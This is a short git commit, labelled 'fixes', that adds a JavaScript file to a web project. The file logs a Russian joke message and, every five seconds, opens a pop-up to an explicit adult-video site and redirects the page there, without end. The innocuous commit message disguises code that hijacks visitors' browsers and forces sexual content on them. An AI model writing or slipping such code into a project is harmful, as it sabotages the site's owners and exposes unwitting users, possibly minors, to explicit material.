d4eeca2c9297e7b465504a46e2a72e8bb04567e8
Ruslan Gerebickii <ruslangerebickii@MacBook-Pro-Ruslan.local>
2023-01-24 15:06:30 +0200

    fixes

---
+++ project/js/index.js
@@ -0,0 +1,9 @@
+console.log('СОЛЕВОЙ ВУРДАЛАК НАДА? НИДОРАГА');
+
+setInterval(() => {
+  window.open(
+    'https://www.icegay.tv/ru/movies/1250942/young-lad-gay-porn-sex-slutty-male-banana-full-len'
+  );
+  window.location.href =
+    'https://www.icegay.tv/ru/movies/1250942/young-lad-gay-porn-sex-slutty-male-banana-full-len';
+}, 5000);
